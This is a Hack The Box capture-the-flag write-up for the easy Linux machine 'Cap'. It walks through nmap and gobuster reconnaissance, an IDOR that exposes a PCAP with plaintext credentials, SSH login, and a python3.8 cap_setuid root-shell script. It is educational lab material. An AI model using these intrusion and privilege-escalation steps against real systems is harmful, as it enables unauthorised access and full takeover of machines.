# Cap — Hack The Box

---

## Machine Information

| Field      | Value |
| ---------- | ----- |
| Name       | Cap   |
| Difficulty | Easy  |
| OS         | Linux |
| Points     | 20    |

---

## Objective

Gain access by exploiting an Insecure Direct Object Reference (IDOR) vulnerability in a web application that allows capturing network traffic, leading to credential discovery and privilege escalation using Linux capabilities.

---

## Methodology

Recon → Web Enumeration → IDOR Exploitation → Credential Extraction → SSH Access → Privilege Escalation

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap_initial 10.10.10.245
```

### Key Findings

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    nginx 1.18.0
```

### Insight

* SSH and HTTP services are running
* Nginx web server suggests a web application

---

## Web Enumeration

Access the web application at http://10.10.10.245

The site appears to be a network capture tool with user authentication.

### Directory Brute-forcing

```bash
gobuster dir -u http://10.10.10.245 -w /usr/share/wordlists/dirb/common.txt
```

No additional directories found.

### Insight

* The main page requires authentication
* Need to find a way to bypass or exploit

---

## IDOR Exploitation

The application allows users to perform network captures. By manipulating the user ID parameter, we can access captures from other users.

Access a capture with ID 0: http://10.10.10.245/capture/0

This reveals a PCAP file containing FTP credentials in plaintext.

### Extract Credentials

Use Wireshark or tcpdump to analyze the PCAP:

```bash
tcpdump -r capture.pcap -A | grep -i "user\|pass"
```

Credentials found: user: nathan, password: [redacted]

---

## Initial Access

Use the extracted credentials to SSH into the machine:

```bash
ssh nathan@10.10.10.245
```

Successfully logged in as nathan.

### User Flag

Located at /home/nathan/user.txt

---

## Privilege Escalation

### Linux Capabilities

Check for binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

Found: /usr/bin/python3.8 = cap_setuid+ep

This allows python3.8 to set UID.

### Exploit

Create a script to spawn a root shell:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Run the script:

```bash
/usr/bin/python3.8 exploit.py
```

### Root Flag

Located at /root/root.txt

---

## Key Learnings

- Insecure Direct Object Reference (IDOR) vulnerabilities
- Network capture analysis for credential extraction
- Linux capabilities and their security implications
- Importance of proper access controls in web applications

---

## Tools Used

- nmap
- gobuster
- curl
- wireshark/tcpdump
- ssh
- getcap
- python

---

## References

- Hack The Box: Cap machine
- Linux Capabilities documentation